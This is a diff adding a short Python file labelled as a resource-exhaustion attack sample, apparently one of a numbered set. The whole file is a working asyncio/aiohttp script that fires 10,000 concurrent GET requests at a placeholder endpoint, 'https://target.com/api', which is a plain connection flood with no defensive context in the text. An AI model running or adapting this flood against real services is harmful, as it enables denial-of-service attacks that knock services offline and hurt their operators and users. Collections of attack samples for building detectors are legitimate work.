@@ -1,0 +1,19 @@
+# Resource Exhaustion - Concurrent Attack Sample 7
+# Created: 2026-03-30T22:24:11.730457
+# Type: Connection Flood / Thread Exhaustion / WebSocket Flood
+
+# Concurrent Connection Flood - Sample 1
+import asyncio
+import aiohttp
+
+async def flood_session(session, url):
+    async with session.get(url) as response:
+        return await response.text()
+
+async def concurrent_flood():
+    url = "https://target.com/api"
+    async with aiohttp.ClientSession() as session:
+        tasks = [flood_session(session, url) for _ in range(10000)]
+        await asyncio.gather(*tasks)
+
+asyncio.run(concurrent_flood())
